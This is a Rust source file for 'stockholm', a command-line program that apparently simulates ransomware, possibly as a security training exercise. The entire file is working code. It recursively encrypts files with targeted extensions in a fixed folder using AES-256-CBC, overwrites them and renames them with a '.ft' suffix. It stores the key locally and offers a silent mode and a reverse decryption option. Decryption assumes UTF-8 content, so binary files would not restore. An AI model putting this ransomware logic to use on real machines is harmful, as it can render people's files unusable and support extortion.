mod constants;
mod errors;
mod utils;

use errors::StockholmError;
use clap::{Arg, ArgAction, Command};
use libaes::Cipher;
use std::{fs, str};
use std::path::{PathBuf};
use std::process::exit;
use base64::{Engine as _, engine::general_purpose};

fn cipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str) -> Result<[u8;16], StockholmError> {
	let file_iv = utils::generate_file_iv(key_encoded.as_str(), file_path)?;
	let file_data = fs::read(file_path).map_err(|err| StockholmError::ReadFile(err.to_string()))?;
	let file_ciphered = cipher.cbc_encrypt(&file_iv, file_data.as_slice());
	let file_encoded = general_purpose::STANDARD.encode(&file_ciphered);
	fs::write(file_path, file_encoded).map_err(|err| StockholmError::WriteFile(err.to_string()))?;
	fs::rename(file_path, format!("{file_path}.ft")).map_err(|err| StockholmError::RenameFile(err.to_string()))?;
	Ok(file_iv)
}

fn cipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) -> Result<(), StockholmError> {
	let paths = fs::read_dir(folder_path).map_err(|err| StockholmError::ReadDir(err.to_string()))?;

	for path in paths {
		if let Err(err) = path {
			eprintln!("Error: an error occurred while reading files in '{folder_path}': {}", StockholmError::ExtractPath(err.to_string()));
			continue;
		}
		let path = path.unwrap().path();
		let path_string = path.to_string_lossy().to_string();
		let file_metadata = fs::metadata(path.clone());
		if let Err(err) = file_metadata {
			eprintln!("Error: can't extract metadata from '{path_string}': {err}");
			continue;
		}
		if file_metadata.unwrap().is_dir() {
			if let Err(err) = cipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent) {
				eprintln!("Error: can't read dir '{folder_path}': {err}");
			}
			continue;
		}
		let extension = path.extension().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
		if !constants::TARGET_EXTENSIONS.contains(&extension.as_str()) {
			if !silent { println!("Skipping: '{path_string}' (extension not supported)") }
			continue
		};
		if let Err(err) = cipher_file(&cipher, &key_encoded, path_string.as_str()) {
			eprintln!("Error: can't cipher '{path_string}': {err}", );
			continue;
		}
		if !silent { println!("Ciphered: '{path_string}'"); }
	}

	Ok(())
}

fn cipher_command(silent: bool) {
	let key = utils::generate_key();
	if let Err(err) = key {
		eprintln!("An error occurred while generating key: {err}");
		return;
	}
	let key = key.unwrap();
	let key_encoded = general_purpose::STANDARD.encode(&key);
	if let Err(err) = fs::write(constants::KEY_FILE, key_encoded.clone()) {
		eprintln!("An error occurred while writing key: {err}");
		return;
	}

	let cipher = Cipher::new_256(&key);
	if let Err(err) = cipher_folder(&cipher, &key_encoded, constants::TARGET_FOLDER, silent) {
		eprintln!("Error: can't cipher target folder '{}': {err}", constants::TARGET_FOLDER)
	}
}

fn decipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str) -> Result<[u8;16], StockholmError> {
	let file_iv = utils::generate_file_iv(key_encoded, file_path)?;
	let file_data = fs::read(file_path).map_err(|err| StockholmError::ReadFile(err.to_string()))?;
	let file_data = general_purpose::STANDARD.decode(&file_data).map_err(|err| StockholmError::Base64Decode(err.to_string()))?;
	let file_data = cipher.cbc_decrypt(file_iv.as_slice(), &file_data);
	let file_data = String::from_utf8(file_data).map_err(|err| StockholmError::Utf8Decode(err.to_string()))?;
	let new_file_name = file_path.trim_end_matches(".ft");
	fs::write(file_path, file_data).map_err(|err| StockholmError::WriteFile(err.to_string()))?;
	fs::rename(file_path, new_file_name).map_err(|err| StockholmError::RenameFile(err.to_string()))?;
	Ok(file_iv)
}

fn decipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) -> Result<(), StockholmError> {
	let paths = fs::read_dir(folder_path).map_err(|err| StockholmError::ReadDir(err.to_string()))?;

	for path in paths {
		if let Err(err) = path {
			eprintln!("Error: an error occurred while reading files in '{folder_path}': {}", StockholmError::ExtractPath(err.to_string()));
			continue;
		}
		let path = path.unwrap().path();
		let path_string = path.to_string_lossy().to_string();
		let file_metadata = fs::metadata(path.clone());
		if let Err(err) = file_metadata {
			eprintln!("Error: can't extract metadata from '{path_string}': {err}");
			continue;
		}
		if file_metadata.unwrap().is_dir() {
			if let Err(err) = decipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent) {
				eprintln!("Error: can't read dir '{folder_path}': {err}");
			}
			continue;
		}
		let extension = path.extension().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
		if extension != "ft" {
			if !silent { println!("Skipping: '{path_string}' (not ciphered)") }
			continue
		};
		if let Err(err) = decipher_file(&cipher, &key_encoded, path_string.as_str()) {
			eprintln!("Error: can't decipher '{path_string}': {err}", );
			continue;
		}
		if !silent { println!("Deciphered: '{path_string}'"); }
	}

	Ok(())
}

fn decipher_command(key_file: &PathBuf, silent: bool) {
	let key_encoded = utils::read_key(key_file);
	if let Err(err) = key_encoded {
		eprintln!("An error occurred while reading key: {err}");
		return;
	}
	let key_encoded = key_encoded.unwrap();
	let key = utils::decode_key(key_encoded.clone());
	if let Err(err) = key {
		eprintln!("An error occurred while decoding key: {err}");
		return;
	}
	let key = key.unwrap();
	let cipher = Cipher::new_256(&key);
	if let Err(err) = decipher_folder(&cipher, &key_encoded, constants::TARGET_FOLDER, silent) {
		eprintln!("Error: can't decipher target folder '{}': {err}", constants::TARGET_FOLDER)
	}}

fn main() {
	let matches = Command::new("stockholm")
		.about("encrypts the target folder")
		.arg(Arg::new("version")
			.short('v')
			.long("version")
			.action(ArgAction::SetTrue)
			.help("prints the current version"))
		.arg(Arg::new("silent")
			.short('s')
			.long("silent")
			.action(ArgAction::SetTrue)
			.help("do not print encrypted file names"))
		.arg(Arg::new("reverse")
			.short('r')
			.long("reverse")
			.value_parser(clap::value_parser!(PathBuf))
			.value_name("KEY")
			.help("decrypts the target folder"))
		.get_matches();

	if matches.get_flag("version") {
		println!("stockholm {}", constants::VERSION);
	}

	if let Some(key) = matches.get_one::<PathBuf>("reverse") {
		decipher_command(key, matches.get_flag("silent"));
		exit(0);
	}

	cipher_command(matches.get_flag("silent"));
}
